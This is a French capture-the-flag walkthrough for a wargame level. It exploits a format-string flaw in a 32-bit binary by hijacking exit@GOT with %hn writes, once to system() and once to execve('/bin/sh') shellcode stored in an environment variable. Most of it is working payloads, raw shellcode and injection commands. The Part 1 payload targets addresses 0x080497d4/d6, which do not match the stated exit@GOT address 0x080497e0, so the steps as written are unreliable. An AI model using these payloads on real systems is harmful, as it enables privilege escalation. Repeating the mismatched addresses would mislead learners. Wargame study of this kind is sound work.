# Walkthrough — Level05 (Format String Exploit)

> Objectif : exploiter une vulnérabilité de type *format string* pour détourner un appel de fonction via la GOT et obtenir un shell.

---

## Partie 1 — Solution directe (exploitation)

### 1. Analyse rapide du binaire

Le programme :
- Lit une chaîne depuis `stdin`.
- Convertit les majuscules en minuscules avec :
  ```c
  buffer[i] ^= 0x20;
  ```
- Affiche le résultat avec un **printf non sécurisé** :
  ```c
  printf(buffer);
  ```
- Appelle ensuite `exit()`.

C’est une vulnérabilité classique de **format string**.

---

### 2. Pourquoi le XOR 0x20 transforme majuscule ↔ minuscule

| Caractère | Hex  | Binaire   |
|-----------|------|-----------|
| 'A'       | 0x41 | 0100 0001 |
| 'a'       | 0x61 | 0110 0001 |
| 'B'       | 0x42 | 0100 0010 |
| 'b'       | 0x62 | 0110 0010 |
| 'Z'       | 0x5A | 0101 1010 |
| 'z'       | 0x7A | 0111 1010 |

La différence est toujours **0x20 (0010 0000)**.

Vérification :
```bash
(gdb) p/x 'b' - 'B'
0x20
(gdb) p/x 'a' - 'A'
0x20
```

---

### 3. Trouver l’offset du buffer dans printf

On utilise le *direct parameter access* :
```bash
python -c 'print("AAAA | %10$x")' | ./level05
aaaa | 61616161
```

👉 Le **10ᵉ argument** correspond au début du buffer.

---

### 4. Cible : détourner exit@GOT vers system()

Adresse de `system()` :
```bash
(gdb) p system
0xf7e6aed0
```

Découpage en deux mots 16 bits :
```text
HIGH = 0xf7e6
LOW  = 0xaed0
```

Adresse de `exit@GOT` :
```bash
objdump -R level05
...
080497e0 R_386_JUMP_SLOT   exit
```

On écrit donc :
```text
0x080497e0 -> LOW
0x080497e2 -> HIGH
```

---

### 5. Calcul des paddings

Les 8 premiers octets imprimés sont les deux adresses GOT.

```text
LOW  = 0xaed0 = 44752
HIGH = 0xf7e6 = 63462

pad1 = LOW - 8 = 44744
pad2 = HIGH - LOW = 18710
```

---

### 6. Payload final (GOT hijack)

```bash
python -c 'print(
  "\xd4\x97\x04\x08" +
  "\xd6\x97\x04\x08" +
  "%44744x%10$hn%18710x%11$hn"
)'
```

Injection :
```bash
(python -c 'print("\xd4\x97\x04\x08" + "\xd6\x97\x04\x08" + "%44744x%10$hn%18710x%11$hn")'; cat) | ./level05
```

À ce stade, `exit()` pointe vers `system()`.

---

## Partie 2 — Variante avec shellcode (recherche avancée)

### 1. Problème : shellcode corrompu

Le XOR casse certains opcodes (ex: `0x51 = 'Q'`).
👉 On place donc le shellcode dans une **variable d’environnement**.

Shellcode execve("/bin/sh") :
```text
\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68
\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
```

---

### 2. Placement dans l’environnement

```bash
export SHELLCODE=$(python -c 'print("\x90" * 50 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")')
```

---

### 3. Récupérer son adresse

Petit programme :
```c
#include <stdio.h>
#include <stdlib.h>
int main() { printf("%p\n", getenv("SHELLCODE")); }
```

```bash
gcc -m32 getenv.c -o getenv
./getenv
0xffffd827
```

On vise le milieu du NOP sled :
```text
TARGET = 0xffffd847
```

Découpage :
```text
low  = 0xd847 = 55367
high = 0xffff = 65535
pad1 = low - 8 = 55359
pad2 = high - low = 10168
```

---

### 4. Payload shellcode

```bash
python -c 'print(
  "\xe0\x97\x04\x08" +
  "\xe2\x97\x04\x08" +
  "%55359x%10$hn%10168x%11$hn"
)'
```

Exécution :
```bash
(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55359x%10$hn%10168x%11$hn")'; cat) | ./level05
```

Puis :
```bash
whoami
level06
```

---

## Conclusion

Deux méthodes fonctionnelles :

1. GOT hijack simple : `exit@GOT → system()` + `/bin/sh`
2. Shellcode env + GOT hijack : `exit@GOT → &SHELLCODE`

Dans les deux cas, le cœur de l’exploit repose sur :
- `%hn`
- découpage 16 bits
- paddings cumulés
- direct parameter access

---

> ✔ Exploit validé — Level05 terminé

